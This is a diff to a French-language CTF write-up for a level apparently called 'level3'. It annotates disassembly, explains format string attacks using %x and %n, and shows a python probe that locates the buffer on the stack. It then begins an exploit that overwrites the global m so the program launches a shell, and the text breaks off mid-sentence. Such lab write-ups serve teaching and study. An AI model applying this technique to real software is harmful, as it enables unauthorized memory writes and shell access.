@@ -12,7 +12,7 @@ disas v :
    0x080484d2 <+46>:	mov    %eax,(%esp)
    0x080484d5 <+49>:	call   0x8048390 <printf@plt> -> exploit possible
    0x080484da <+54>:	mov    0x804988c,%eax
-   0x080484df <+59>:	cmp    $0x40,%eax             -> comparaison, egale on rentre 
+   0x080484df <+59>:	cmp    $0x40,%eax             -> comparaison, si egalité on rentre 
                                                         if, affiche fwrite et lance un
                                                         shell.
    0x080484e2 <+62>:	jne    0x8048518 <v+116>
@@ -33,10 +33,21 @@ x/s 0x804988c : 0x804988c <m>:	 "" -> objet m qui semble être une string vide
 x 0x804988c : 0x804988c <m>:	0x00000000 -> en hex
 
 L'idée est donc de modifier m avec printf grace a une format string attack.
+Le format string attack permet de lire des données depuis la stack (%x) et de réécrire 
+des données en mémoire dans le process (%n). On peut également préciser un padding entre
+le % et le x/n pour indiquer où se situe ce que je veux modifier.
 
-On check la position du buffer :
+Checkons la position du début de mon buffer :
 python -c 'print "AAAA"+" %x"*15' | ./level3
-A COMPLETER !!
+      1     2        3        4
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 
+78252078 20782520 25207825 78252078 20782520 25207825
+On peut donc écrire à partir de la 4eme position sur la stack.
+
+L'objet que l'on veut modifier est à l'adresse : 0x804988c (cf ci dessus l'adresse de m),
+on va donc écrire son adresse en premier sur la stack pour pouvoir ensuite le modifier.
+On sait que l'adresse de notre objet sera donc à la 4eme position sur la stack (grace à
+l'étape du dessus).
 
 Je teste en premier avec %4$42x dans mon exploit :
 0x804988c <m>:	0x00000039 -> pas très loin de ce que je veux ! Il faut que 
